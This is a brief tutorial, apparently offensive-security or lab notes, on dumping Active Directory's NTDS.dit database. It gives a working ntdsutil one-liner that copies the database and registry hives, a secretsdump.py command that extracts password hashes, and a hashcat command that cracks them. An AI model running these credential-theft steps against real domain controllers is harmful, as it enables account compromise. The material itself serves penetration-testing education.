**New Technologies Directory Services (NTDS)**

Is a database containing all Active Directory data, including objects, attributes, credentials, etc.<br>
NTDS is located in ```C:\Windows\NTDS``` by default, and it is encrypted to prevent data extraction from a target machine. Accessing the ```NTDS.dit``` file from the machine running is disallowed since the file is used by Active Directory and is locked.
<br>However, there are various ways to gain access to it. 
we will use ```ntdsutil``` tool to make a copy to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the ```SECURITY``` file system. Therefore, we must also dump the security file containing all required files to decrypt. <br>

**Local Dumping (No Credentials)**

This is usually done if you have no credentials available but have administrator access to the domain controller.<br>
To successfully dump the content of the NTDS file we need the following files:

    C:\Windows\NTDS\ntds.dit
    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY

The following is a one-liner PowerShell command to dump the NTDS file using the ```Ntdsutil``` tool in the ```C:\temp``` directory.
```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
Now, if we check the c:\temp directory, we see two folders: ```Active Directory``` and ```registry```.<br>
The two folders contain the required 3 files mentioned above.<br>
Then we will use ```secretsdump.py``` tool to extract the hashes.
```
secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```
Finally, we could use ```hashcat``` to crack the hashes.
```
hashcat -m 1000 -a 0 hashes.txt /path/to/rockyou.txt --force
```

















        

